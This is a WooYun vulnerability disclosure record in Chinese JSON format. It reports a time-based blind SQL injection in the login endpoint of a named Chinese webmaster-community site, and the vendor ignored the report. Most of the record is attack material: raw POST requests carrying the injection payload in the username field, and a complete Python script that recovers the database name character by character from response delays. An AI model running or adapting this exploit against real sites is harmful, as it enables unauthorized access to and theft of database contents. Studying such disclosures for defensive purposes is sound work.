{"id": 66273, "wybug_id": "wooyun-2015-0149010", "wybug_title": "A5站长网某站存在SQL注入漏洞(附验证脚本)", "wybug_corp": "A5站长网", "wybug_author": "中央军", "wybug_date": "2015-10-23 23:33", "wybug_open_date": "2015-10-28 23:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  \nPOST /Login/login HTTP/1.1Host: lianmeng.admin5.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221c320e29cca506504514677a0d5fd96d%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%22210.74.157.98%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A65%3A%22Mozilla%2F5.0+%28Windows+NT+5.1%3B+rv%3A40.0%29+Gecko%2F20100101+Firefox%2F40.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1445589426%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Db420bfdef11a47e249791b34c8cf9b670d135b57; CNZZDATA1253702959=369810679-1445589126-%7C1445589126Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 106change=&password=g00dPa%24%24w0rD&username='XOR(if(now()=sysdate(),SLEEP(IF(length(database())=11,5,0)),0))OR'\n延迟注入为真时，延迟5秒，db长度为11：\n\n为假时，不延迟：\n\ndb的第一位为l（ascii：108）\nPOST /Login/login HTTP/1.1Host: lianmeng.admin5.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221c320e29cca506504514677a0d5fd96d%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%22210.74.157.98%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A65%3A%22Mozilla%2F5.0+%28Windows+NT+5.1%3B+rv%3A40.0%29+Gecko%2F20100101+Firefox%2F40.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1445589426%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Db420bfdef11a47e249791b34c8cf9b670d135b57; CNZZDATA1253702959=369810679-1445589126-%7C1445589126Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 114change=&password=g00dPa%24%24w0rD&username='XOR(if(now()=sysdate(),SLEEP(IF(ascii(mid(database(),1,1))=108,5,0)),0))OR'\n\n\n\n\n\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibimport mathheaders = {'Content-Type':'application/x-www-form-urlencoded'}payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'print 'Start to retrive MySQL DB:'db= ''for i in range(1, 12):    for payload in payloads:            #time.sleep(5)    #5秒来一发            s = \"change=&password=g00dParD&username='XOR(if(now()=sysdate(),SLEEP(IF(ascii(mid(database(),%s,1))=%s,3,0)),0))OR'\" % (i, ord(payload))            conn = httplib.HTTPConnection('lianmeng.admin5.com', timeout=150)            conn.request(method='POST',                         url='/Login/login',                         body=s,                         headers=headers)            start_time = time.time()            conn.getresponse()            conn.close()            print '.',                   if time.time() - start_time > 3.0:                db += payload                print '\\n\\n[in progress]', db,                breakprint '\\n\\n[Done] MySQL DB is %s' % db\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 中央军@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-28 23:34 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-29 11:04 |    \t\t计算姬 \t\t\t( 普通白帽子  |\t\t\t        Rank:444 漏洞数:97        | 看我看我看我啊)\t\t \n  s = \"change=&password=g00dParD&username='XOR(if(now()=sysdate(),SLEEP(IF(ascii(mid(database(),%s,1))=%s,3,0)),0))OR'\" % (i, ord(payload))这句该怎么理解    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}